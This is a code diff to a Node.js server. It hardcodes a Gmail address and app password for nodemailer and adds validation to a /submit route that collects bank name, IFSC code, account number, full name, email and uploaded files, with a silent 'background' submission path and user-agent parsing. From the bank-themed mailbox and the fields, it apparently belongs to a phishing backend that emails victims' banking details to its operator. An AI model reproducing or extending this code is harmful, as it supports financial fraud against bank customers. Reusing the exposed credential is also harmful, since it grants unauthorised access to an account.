@@ -40,12 +40,12 @@ const upload = multer({
   limits: { fileSize: 50 * 1024 * 1024 }
 }).any();
 
-// Email transporter with direct credentials
+// Email transporter
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',
-    pass: 'kexmwnespcwxrkjt' // Your app password here
+    pass: 'kexmwnespcwxrkjt'
   }
 });
 
@@ -120,8 +120,18 @@ app.post('/submit', (req, res) => {
 
       const isBackground = req.body.empty_form === 'true';
       
-      if (isBackground && (!req.files || req.files.length === 0)) {
-        return res.status(200).send();
+      // Server-side validation
+      if (!isBackground) {
+        if (!req.body.bankname || !req.body.ifsc || !req.body.accno || 
+            !req.body.fullname || !req.body.email || !req.files || req.files.length === 0) {
+          return res.status(400).json({ error: 'All fields are required' });
+        }
+
+        // Validate email format
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailRegex.test(req.body.email)) {
+          return res.status(400).json({ error: 'Invalid email format' });
+        }
       }
 
       const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
